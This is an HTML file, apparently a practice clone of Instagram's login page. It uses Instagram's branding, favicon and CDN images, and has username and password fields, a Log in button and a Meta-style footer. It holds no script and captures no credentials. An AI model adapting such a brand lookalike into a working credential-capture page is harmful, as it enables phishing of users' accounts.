<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="Css.css">
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
    <title>Instagram</title>
</head>
<body>
    <div class="content">
        <div class="left">
            <img id="phone"src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__makehaste_cache_breaker=73SVAexZgBW" alt="phones">
                <div class="pic-container">
                    <img id="pic1" src="pic1.png" alt="pic1">
                    <img id="pic2" src="pic2.png" alt="pic2">
                    <img id="pic3" src="pic3.png" alt="pic3">
                    <img id="pic4" src="pic4.png" alt="pic4">
                </div>
        </div>

        <div class="right">
            <label id="ins"> Instagram </label>
                <div id="login">
                    <input id="user" type="text" placeholder="Phone number, username, or email">
                    <input id="password" type="password" placeholder="Password">
                    <button id="btnlogin" type="button">Log in</button>
                </div>

        </div>

    </div>

    <footer>

        <div>
            <span>
                Meta
            </span>
            <span>
                About
            </span>
            <span>
                Blog
            </span>
            <span>
                Jobs
            </span>
            <span>
                Help
            </span>
            <span>
                API
            </span>
            <span>
                Privacy
            </span>
            <span>
                Terms
            </span>
            <span>
                Top Accounts
            </span>
            <span>
                Locations
            </span>
            <span>
                Intagram Lite
            </span>
            <span>
                Threads
            </span>
            <span>
                Contact Uploading & Non-Users
            </span>
            <span>
                Meta Verified
            </span>
        </div>
            
        <div class="container">
            <div>
                <select id = "selected_2023">

                    <option>Afrikaans</option>
                    <option>Čeština</option>
                    <option>Dansk</option>
                    <option>Deutsch</option>
                    <option>Ελληνικά</option>
                    <option selected>English</option>
                    <option>English (UK)</option>
                    <option>Español (España)</option>
                    <option>Español</option>
                    <option>Suomi</option>


                 </select>

            <div>

                    © 2023 Instagram from Meta
                </span>
